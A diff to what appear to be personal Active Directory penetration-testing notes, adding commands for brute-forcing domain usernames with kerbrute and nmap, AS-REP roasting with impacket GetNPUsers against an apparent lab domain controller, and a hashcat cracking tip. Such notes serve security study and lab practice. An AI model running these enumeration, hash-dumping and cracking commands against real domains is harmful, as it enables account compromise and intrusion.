@@ -39,6 +39,17 @@ Users are core of AD and DC's task is to manage access of those users to service
 * Local Administrators: local machine administrators. Compromis of local admin can lead to ticket and credentials grabbing from local machine to impersonate other users and services in AD.
 * Domain Users: normal users. They can log into machines where they are authorized to. Users may be part of interesting groups that allows lateral movement once the user account is compromised.
 
+#### Bruteforce Users
+
+* Preferred way: kerbrute
+
+`./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.43.76  userlist.txt`
+
+* Nmap> sometimes crashes
+```
+nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm='spookysec.local', userdb=userlist.txt 10.10.43.76"
+```
+
 ## Groups
 
 * Security Groups: permissions users and services. Some groups have rights to change DACLs.
@@ -202,13 +213,15 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 ```
 
-   1. Look for users via enum4linux. Delete stuff after first space: 
+   1. Look for users via enum4linux or kerbrute. Delete stuff after first space: 
    cut -d ' ' -f 1 < users.txt  
       
    2. Use ASREP roast against users in the ldapenum_asrep_users.txt file
     
 	```
    GetNPUsers.py xxx.com/xxx:xxx -usersfile usersall.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.11.1.xxx
+
+   impacket-GetNPUsers spookysec.local/ -no-pass -usersfile spookyusers.txt -format hashcat -outputfile spooky.hash -dc-ip 10.10.43.76
    ```
 	
 	OR with Rubeus
@@ -221,6 +234,7 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
    
    hashcat -a 0 -m 18200 hc.txt  /usr/share/wordlists/rockyou.txt
 
+   #Attention: save as ANSI encoding using notepad.exe if cracked in windows
 ```
 
 
